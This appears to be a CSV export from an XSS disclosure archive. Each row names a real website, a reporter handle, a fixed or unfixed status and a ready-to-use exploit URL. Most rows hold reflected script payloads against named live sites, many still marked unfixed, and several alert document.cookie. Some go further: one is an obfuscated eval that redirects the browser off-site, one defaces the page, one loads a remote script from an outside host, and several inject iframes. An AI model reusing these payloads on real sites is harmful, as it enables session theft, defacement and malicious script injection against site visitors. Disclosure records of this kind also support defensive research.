Datesubmitted,Datepublished,Status,Author,Domain,Category,Pagerank,URL
08/09/2012,12/03/2015,UNFIXED,OrionEinfold,cyber.law.harvard.edu,XSS,1037,http://cyber.law.harvard.edu/stockspam/public/onemsg.php?symbol=%3Ch1%3E%3Cscript%3Ealert%28/hacked/%29%3C/script%3E%3C/h1%3E&id=58873%22%27--
21/12/2012,12/03/2015,UNFIXED,cyb3r.pr3dat0r,kids.britannica.com,XSS,3732,http://kids.britannica.com/search?query=%3CIMG+%22%22%22%3E%3CSCRIPT%3Ealert%28%22cyb3r_pr3dat0r%22%29%3C%2FSCRIPT%3E%22%3E&fuzzy=true&ct=null&autobounce=true
10/01/2015,12/03/2015,UNFIXED,Uber0n,www.dohabank.com.qa,XSS,83899,http://www.dohabank.com.qa/1/db2/SearchResults.aspx?Search=%3C%2fscript%3E%3Cimg%2f*%2500%2fsrc%3d%22worksinchrome%26colon%3bprompt%26%23x28%3b1%26%23x29%3b%22%2f%2500*%2fonerror%3d%27eval%28src%29%27%3E
29/10/2014,12/03/2015,UNFIXED,WIBF,topup.orange.com,XSS,21685,"https://topup.orange.com/?_lang=""><script>alert(document.cookie)</script>"
16/02/2015,12/03/2015,UNFIXED,raVen,library.leeds.ac.uk,XSS,17850,http://library.leeds.ac.uk/site/scripts/google_results.php?q=bentley&stylesheet=%22%3E%3Cscript%3Ealert%28%27raVen%27%29%3C/script%3E&collections=libcms
01/08/2012,12/03/2015,FIXED,M4ke,www.elle.fr,XSS,8144,"http://www.elle.fr/action/login?ReturnUrl=http://www.elle.fr/recherche/recherche-globale/(searchText)/""/><script>alert('XSSByM4ke')</script>"
23/06/2014,12/03/2015,UNFIXED,rstforums,loadgamesvf.bet365.com,XSS,254,http://loadgamesvf.bet365.com/f1x2games/loadGame.jsp?gameID=F1X2_FOOTBALL&version=1&lang=%22en&acc_id=1EC6296318CF49888464BDA22A78EB2C000004&baseURL=%22);%3C/script%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
02/03/2012,12/03/2015,FIXED,haRI,developer.lgmobile.com,XSS,149164,http://developer.lgmobile.com/lge.mdn.com.search.dev
01/03/2012,12/03/2015,FIXED,necromoine,www.pixelempireclothing.com,XSS,0,http://www.pixelempireclothing.com/fr/recherche?orderby=position&orderway=desc&search_query=\%22/%3E%3Cscript%3Ealert(1);%3C/script%3E
01/03/2012,12/03/2015,FIXED,IrIsT.Ir,www.dysontt.com,XSS,0,"http://www.dysontt.com/main.php?id=9""><script>alert(document.cookie)</script>"
01/03/2012,12/03/2015,FIXED,IrIsT.Ir,ipcprogram.com,XSS,0,http://ipcprogram.com/main.php?id=Janlady6%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E
01/03/2012,12/03/2015,FIXED,IrIsT.Ir,www.ncgg.info,XSS,0,http://www.ncgg.info/main.php?id=26%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E
01/03/2012,12/03/2015,FIXED,IrIsT.Ir,www.iiar-anticancer.org,XSS,7686744,"http://www.iiar-anticancer.org/search.php?srch=""><script>alert(document.cookie)</script>&x=0&y=0"
01/03/2012,12/03/2015,UNFIXED,flexxpoint,www.phishtank.com,XSS,117227,"http://www.phishtank.com/phish_screenshot.php?phish_id=%22%3E%3Cinput%20type=submit%20value=CLICK%A0HERE%A0TO%A0TRIGGER%A0XSS!%20onClick=confirm%28navigator.userAgent%29;alert%28/XSS%A0EXAMPLE/.source%29;eval(String.fromCharCode(119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,46,97,115,115,105,103,110,40,34,104,116,116,112,58,47,47,110,121,97,110,46,99,97,116,34,41));BODY%20BGCOLOR=%22#111111%22%3E"
01/03/2012,12/03/2015,FIXED,Bl3ck0uT,domains.whois.com,XSS,1459,http://domains.whois.com/hosting.php?type=%27%22%3E%3Ciframe%20src=%22http://xssed.com%22%3E
01/03/2012,12/03/2015,FIXED,FabianCuchietti,www.metasploit.net,XSS,0,http://www.metasploit.net/modules/framework/search?bid=1&cve=1&msb=%F6%22%20onmouseover%3Dprompt%28906772%29%20%2F%2F&osvdb=1&text=1&utf8=%C3%A2%C5%93%E2%80%9C
01/03/2012,12/03/2015,FIXED,FabianCuchietti,www.metasploit.com,XSS,166837,http://www.metasploit.com/modules/framework/search?bid=1&cve=1&msb=%f6%22%20onmouseover%3dprompt%28906772%29%20%2f%2f&osvdb=1&text=1&utf8=%C3%A2%C5%93%E2%80%9C
29/02/2012,12/03/2015,UNFIXED,Atmon3r,www.maquis-art.com,XSS,651956,"http://www.maquis-art.com/shop/index.php?page=1&objet_recherche=/""><script>alert('XssByAtm0n3r')</script>"
29/02/2012,12/03/2015,FIXED,wutsec,www.bwin.com,XSS,4216,https://www.bwin.com/nl/debug/querybc3.aspx?tableName=%3Cscript%3Ealert%28document.cookie%29%3C/script%3E
29/02/2012,12/03/2015,FIXED,necromoine,www.steria-psf.lu,XSS,0,http://www.steria-psf.lu/index.php?mact=Search%2Ccntnt01%2Cdosearch%2C0&cntnt01returnid=239&cntnt01searchinput=%22%2F%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E&x=0&y=0
29/02/2012,12/03/2015,UNFIXED,Cr4t3r,www.tasteofsouthflorida.com,XSS,27110059,"http://www.tasteofsouthflorida.com/cgi-bin/tseekdir.cgi?location=Root-Miami,045Dade_Restaurants-South_Beach%27%3E%3Cscript%3Ealert%28%22Cr4t3r%20Was%20Here%22%29;//%3C/script%3E"
29/02/2012,12/03/2015,FIXED,Cr4t3r,www.cyprus-directory.com,XSS,8904981,http://www.cyprus-directory.com/cgi-bin/tseekdir.cgi?location=Root-Arts_and_Humanities-Museums%27%3E%3Cscript%3Ealert%28%22Cr4t3r%20Was%20Here%22%29;//%3C/script%3E
29/02/2012,12/03/2015,FIXED,owege,autonews.sat1.de,XSS,11086,"http://autonews.sat1.de/auto/news/index.jsp?marke=""><script>alert(document.cookie)</script>&submit=OK"
29/02/2012,12/03/2015,UNFIXED,owege,www.auto-news.de,XSS,82203,"http://www.auto-news.de/sondermodelle/index.jsp?marke=""><script>alert(document.cookie)</script>"
29/02/2012,12/03/2015,UNFIXED,UR0B0R0X,www.sfelipeneri.edu.ec,XSS,0,http://www.sfelipeneri.edu.ec/fedec/book/guestbook.php?act=show&page=2584&lang=%22%3E%3E%3Cscript%3Ealert%28%22\\_UR0B0R0X_/%22%29%3C/script%3E
29/02/2012,12/03/2015,FIXED,worldwideweb,tikona.in,XSS,3592,http://tikona.in/pincode.php?contentid=%22%3E%3Cscript%3Ealert%28/www/%29%3C/script%3E
28/02/2012,12/03/2015,UNFIXED,Atmon3r,www.coolwebscripts.com,XSS,898029,"http://www.coolwebscripts.com/search_view_script.php?search=/""><script>alert(1)</script>&cat_drop=&offset=0&toshow=20&GO.x=14&GO.y=14"
28/02/2012,12/03/2015,FIXED,FabianCuchietti,www.arremate.com,XSS,0,http://www.arremate.com/brasil/ml/l_user.main?as_filtro_id=CERTIFIED_USR&as_nickname=%A0&as_pcia_id=%3E%22%3E%3CScRiPt%3Ealert%28%27XSS%27%29;%3C/scRipt%3E
28/02/2012,12/03/2015,FIXED,FabianCuchietti,www.deremate.cl,XSS,711167,http://www.deremate.cl/chile/ml/l_user.main?as_filtro_id=CERTIFIED_USR&as_nickname=%A0&as_pcia_id=%3E%22%3E%3CScRiPt%3Ealert%28%27XSS%27%29;%3C/scRipt%3E
28/02/2012,12/03/2015,UNFIXED,FabianCuchietti,www.deremate.com.ve,XSS,0,http://www.deremate.com.ve/venezuela/ml/l_user.main?as_filtro_id=CERTIFIED_USR&as_nickname=%A0&as_pcia_id=%3E%22%3E%3CScRiPt%3Ealert%28%27XSS%27%29;%3C/scRipt%3E
21/09/2014,12/03/2015,UNFIXED,az7rb,www.yemen.gov.ye,XSS,335994,http://www.yemen.gov.ye/portal/gov/%D8%A7%D9%84%D8%A3%D8%AE%D8%A8%D8%A7%D8%B1/tabid/959/mid/3178/Default.aspx?SearchTerm=%3Cimg%20src=%27aaa%27%20onerror=alert%281%29%3E
27/10/2012,12/03/2015,FIXED,n0caReTeAm,www.clixsense.com,XSS,1190,"http://www.clixsense.com/en/Games/%22%3E%3Cscript%3Ealert%28String.fromCharCode%28110,%2048,%2099,%2097,%2082,%20101,%2084,%20101,%2065,%20109,%2032,%2088,%20115,%20115%29%29%3C/script%3E%3Ciframe%20src=%22http://xssed.com%22%3E"
03/01/2014,12/03/2015,FIXED,Conslight,www.culture.gouv.fr,XSS,38558,"http://www.culture.gouv.fr/public/mistral/merimee_fr?ACTION=CHERCHER&FIELD_1=REF&VALUE_1=%22%27%3E%22%27%3E%22%27%3E%3Cscript%3Edocument.body.innerHTML=String.fromCharCode%2860,%2099,%20101,%20110,%20116,%20101,%20114,%2062,%2060,%20104,%2049,%2062,%2067,%20111,%20110,%20115,%20108,%20105,%20103,%20104,%20116,%2032,%20112,%20119,%20110,%20100,%2032,%20117,%2033,%2032,%2058,%2068,%2060,%2047,%20104,%2049,%2062,%2060,%2098,%20114,%2062,%2060,%20104,%20114,%2062,%2060,%2098,%20114,%2062,%2060,%20104,%2050,%2062,%2035,%2084,%20104,%20101,%2032,%2072,%2097,%2099,%20107,%20101,%20114,%20115,%2032,%2066,%2097,%20121,%2060,%2047,%20104,%2050,%2062,%2060,%20104,%20114,%2062,%2060,%20105,%20109,%20103,%2032,%20115,%20114,%2099,%2061,%2039,%20104,%20116,%20116,%20112,%2058,%2047,%2047,%20105,%20109,%20103,%2046,%20103,%2097,%20119,%20107,%20101,%20114,%2097,%20115,%20115,%20101,%20116,%20115,%2046,%2099,%20111,%20109,%2047,%20105,%20109,%20103,%2047,%2049,%2055,%20122,%2048,%20105,%2099,%2055,%2049,%2099,%20113,%2049,%2052,%2057,%20106,%20112,%20103,%2047,%20107,%20117,%2045,%20120,%20108,%2097,%20114,%20103,%20101,%2046,%20106,%20112,%20103,%2039,%2060,%2047,%2099,%20101,%20110,%20116,%20101,%20114,%2062%29%3C/script%3E"
21/02/2015,12/03/2015,FIXED,AnonGuy,thepiratebay.cr,XSS,2252,https://thepiratebay.cr/search.php?q=<script>alert(document.cookie)</script>
31/03/2012,12/03/2015,FIXED,0z0n3,defense.aol.com,XSS,159,http://defense.aol.com/search/?q=%3CIMG+%22%22%22%3E%3CSCRIPT%3Ealert%28%22XSS%22%29%3C%2FSCRIPT%3E%22%3E
29/02/2012,12/03/2015,UNFIXED,Sony,solutions.liveperson.com,XSS,24336,"http://solutions.liveperson.com/landing-pages/live-chat/a2?siteID=%27;alert%28String.fromCharCode%2888,83,83%29%29//\%27;alert%28String.fromCharCode%2888,83,83%29%29//%22;alert%28String.fromCharCode%2888,83,83%29%29//\%22;alert%28String.fromCharCode%2888,83,83%29%29//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888,83,83%29%29%3C/SCRIPT%3E"
28/02/2012,12/03/2015,FIXED,FabianCuchietti,uk.playstation.com,XSS,655,"http://uk.playstation.com/psp/system/detail/item398424/Disney%E2%80%A2Pixar-Cars-2,-Geronimo-Stilton-in-the-Kingdom-of-Fantasy-The-Videogame-and-PSP-E1000/Cufon.now/%F6%22%20onmouseover=prompt%28%27@fabiancuchietti%27%29%20//"
29/02/2012,12/03/2015,FIXED,flexxpoint,www.ubuntu.com,XSS,1408,http://www.ubuntu.com/certification/models?form.search_text=Dell%22%3E%3Cscript%3Ealert(/xss-Bulgaria/.source)%3C/script%3E&form.hardware_category=LAPTOP
28/02/2012,12/03/2015,FIXED,UR0B0R0X,www.museociudadquito.gob.ec,XSS,14975990,http://www.museociudadquito.gob.ec/www/busqueda/busqueda.php?buscar=+%2F%2F%22%3E%27%3E%3CSCRIPT%3Ealert%28%22[_UR0B0R0X_]%22%29%3C%2FSCRIPT%3E
28/02/2012,12/03/2015,UNFIXED,bastich,www.opera-guide.ch,XSS,1631802,http://www.opera-guide.ch/index.php?uilang=en%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E
28/02/2012,12/03/2015,FIXED,crucki,www.universal-alliance.de,XSS,2426949,http://www.universal-alliance.de/index.php?site=message&msg=<script>alert(1)</script>
15/11/2014,12/03/2015,UNFIXED,Xermes,www.avis.co.uk,XSS,79608,http://www.avis.co.uk/site-search?header-site-search=%27%3E%3Cscript%3Ealert%28+document.cookie%29%3C/script%3E
31/01/2013,12/03/2015,FIXED,CyberBellona,www.fly.faa.gov,XSS,14421,https://www.fly.faa.gov/rvsm/rvsmInputError.jsp?msg=<ScRiPt>alert('LastRider-CyberBellona')</ScRiPt>
30/01/2015,10/03/2015,UNFIXED,IsmailSaygili,www.mcafeesecure.com,XSS,15640,https://www.mcafeesecure.com/not-certified?host=%22onmouseover%3d%22alert%281%29%22style%3d%22position%3aabsolute%3bwidth%3a100%25%3bheight%3a100%25%3btop%3a0%3bleft%3a0%3b%22
07/02/2015,10/03/2015,UNFIXED,v30sharp,www.mikrotik.com,XSS,15884,http://www.mikrotik.com/shopping.php?sect=%22%3E%3Cscript%3Ealert%28%27v30sharp%27%29;%3C/script%3E
19/02/2015,10/03/2015,UNFIXED,anon,9gag.com,XSS,212,http://9gag.com/signup?method=email&error=%3Cscript%3Ealert%28%27xss!%27%29;%3C/script%3E
28/02/2012,10/03/2015,FIXED,Atmon3r,www.pnop.com,XSS,7431401,"http://www.pnop.com/search?q=/""><script>alert('XssByAtm0n3r')</script>"
28/02/2012,10/03/2015,UNFIXED,Atmon3r,www.torrents.net,XSS,6672,"http://www.torrents.net/find/""><script>alert('XssByAtm0n3r')</script>/"
28/02/2012,10/03/2015,FIXED,MatiasVicente,e360.yale.edu,XSS,3313,http://e360.yale.edu/mobile/feature.msp?id=2392%27%22%3E%3CscRipt%3Ealert%28/Xss/%29%3C/ScRIPT%3E
28/02/2012,10/03/2015,FIXED,MatiasVicente,ayalists.yale.edu,XSS,3313,http://ayalists.yale.edu/lists/lists.php?id=15%27%22%3E%3CscRipt%3Ealert%28/Xss/%29%3C/SCript%3E
28/02/2012,10/03/2015,FIXED,MatiasVicente,frenchstudies.research.yale.edu,XSS,3313,http://frenchstudies.research.yale.edu/back_issues.php?id=%22%3E%3CscRipt%3Ealert%28/Xss/%29%3C/SCript%3E
28/02/2012,10/03/2015,FIXED,MatiasVicente,www.circulo.claro.com.ar,XSS,26052,http://www.circulo.claro.com.ar/index.php?Itemid=%22onmouseover=alert%28document.cookie%29%20bad=%22
27/02/2012,10/03/2015,FIXED,Atmon3r,www.hostinway.com,XSS,12663604,"http://www.hostinway.com/login/?ru=P3BhZ2U9aGVscGRlc2smYWN0aW9uPWFkZF90aWNrZXQ=""><script>alert('XssByAtm0n3r|Fuckingspamer!')</script>"
27/02/2012,10/03/2015,FIXED,Atmon3r,www.coqnu.com,XSS,10161,"http://www.coqnu.com/search/?q=""><script>alert('XssByAtm0n3r')</script>&submit=Rechercher"
27/02/2012,10/03/2015,UNFIXED,Mr.JurisT,www.gtgroup.ge,XSS,6071530,http://www.gtgroup.ge/php_thumb/demo/phpThumb.demo.demo.php/%22onmouseover=prompt%28903901%29%3E
27/02/2012,10/03/2015,UNFIXED,Mr.JurisT,www.lukoil.ge,XSS,1654397,http://www.lukoil.ge/index.php/%22onmouseover=prompt%28980237%29%3E
27/02/2012,10/03/2015,UNFIXED,Atmon3r,www.narbonne.fr,XSS,1088033,http://www.narbonne.fr/search/google/%252F%22%3E%3Cscript%20type%3D%22text/javascript%22%20src%3D%22http%3A/%252Fyourjavascript.com/27544112151/xss.atmon3r.js%22%3E%3C/script%3E?query=%2F%22%3E%3Cscript%20type%3D%22text%2Fjavascript%22%20src%3D%22http%3A%2F%2Fyourjavascript.com%2F27544112151%2Fxss.atmon3r.js%22%3E%3C%2Fscript%3E&cx=013547730913211493630%3Aj69brl4dbyu&cof=FORID%3A11&sitesearch=&hl=fr&lr=lang_fr
27/02/2012,10/03/2015,UNFIXED,ZhcPoint,partners.rt.com,XSS,411,http://partners.rt.com/search/hotels/?q=%3Ciframe+src%3D%22http%3A%2F%2Fxssed.com%22%3E
27/02/2012,10/03/2015,FIXED,Uber0n,www4b.wolframalpha.com,XSS,2109,http://www4b.wolframalpha.com/input/signup.jsp
27/02/2012,10/03/2015,FIXED,x1337Sec,www.ddindia.gov.in,XSS,67265,http://www.ddindia.gov.in/DDIndiaChannel/KendraHome.aspx?k=<script>alert(document.cookie)</script>
27/02/2012,10/03/2015,FIXED,cyber3vil,reseller-sisko.kamadeva.com,XSS,5813089,"http://reseller-sisko.kamadeva.com/index.php?alert=<iframesrc=""http://xssed.com"">"
26/02/2012,10/03/2015,FIXED,Atmon3r,buyinglamictal.org,XSS,0,"http://buyinglamictal.org/search.php?search_text=/""><script>alert(1)</script>&I1.x=3&I1.y=11"
26/02/2012,10/03/2015,FIXED,Atmon3r,buyingcozaar.org,XSS,0,"http://buyingcozaar.org/search.php?search_text=/""><script>alert(1)</script>&I1.x=3&I1.y=11"
26/02/2012,10/03/2015,FIXED,Atmon3r,drug-doxycycline.com,XSS,0,"http://drug-doxycycline.com/search.php?search_text=/""><script>alert(1)</script>&I1.x=3&I1.y=11"
26/02/2012,10/03/2015,FIXED,Atmon3r,bestsellers-rx.com,XSS,0,"http://bestsellers-rx.com/search.php?search_text=/""><script>alert(1)</script>&I1.x=12&I1.y=14"
26/02/2012,10/03/2015,FIXED,Atmon3r,drug-accutane.com,XSS,0,"http://drug-accutane.com/search.php?search_text=/""><script>alert(1)</script>&I1.x=12&I1.y=14"
26/02/2012,10/03/2015,FIXED,Atmon3r,buyingprograf.org,XSS,0,"http://buyingprograf.org/search.php?search_text=/""><script>alert(1)</script>&I1.x=12&I1.y=14"
26/02/2012,10/03/2015,FIXED,Atmon3r,ed-pharmarx.com,XSS,0,"http://ed-pharmarx.com/search.php?search_text=/""><script>alert(1)</script>&I1.x=12&I1.y=14"
26/02/2012,10/03/2015,FIXED,Atmon3r,gobuypills.com,XSS,0,"http://gobuypills.com/search.php?search_text=/""><script>alert(1)</script>&I1.x=12&I1.y=14"
26/02/2012,10/03/2015,FIXED,Atmon3r,drugbrand-cialis.com,XSS,20251525,"http://drugbrand-cialis.com/search.php?search_text=/""><script>alert(1)</script>&I1.x=12&I1.y=14"
26/02/2012,10/03/2015,FIXED,Atmon3r,drug-clomid.com,XSS,0,"http://drug-clomid.com/search.php?search_text=/""><script>alert(1)</script>"
26/02/2012,10/03/2015,FIXED,Atmon3r,drugsforyou.net,XSS,0,"http://drugsforyou.net/search.php?search_text=/""><script>alert(1)</script>&I1.x=12&I1.y=14"
26/02/2012,10/03/2015,FIXED,Atmon3r,drug-brand-cialis.com,XSS,0,"http://drug-brand-cialis.com/search.php?search_text=/""><script>alert(1)</script>"
26/02/2012,10/03/2015,FIXED,Atmon3r,prohealthpharma.com,XSS,0,"http://prohealthpharma.com/search.php?search_text=/""><script>alert(1)</script>&I1.x=3&I1.y=11"
26/02/2012,10/03/2015,FIXED,Tux1,egglondon.net,XSS,7529339,"http://egglondon.net/cms.cgi?function=&searchfor=%3Cscript%3Ealert%28%22tutorial%22%29;%3C/script%3EFuck%20You%20Egg,%20by%20Tux1%3Ciframe%20src=%22http://xssed.com%22%3E"
25/02/2012,10/03/2015,FIXED,frite,textbooknova.com,XSS,70080,http://textbooknova.com/?q=%22/%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E
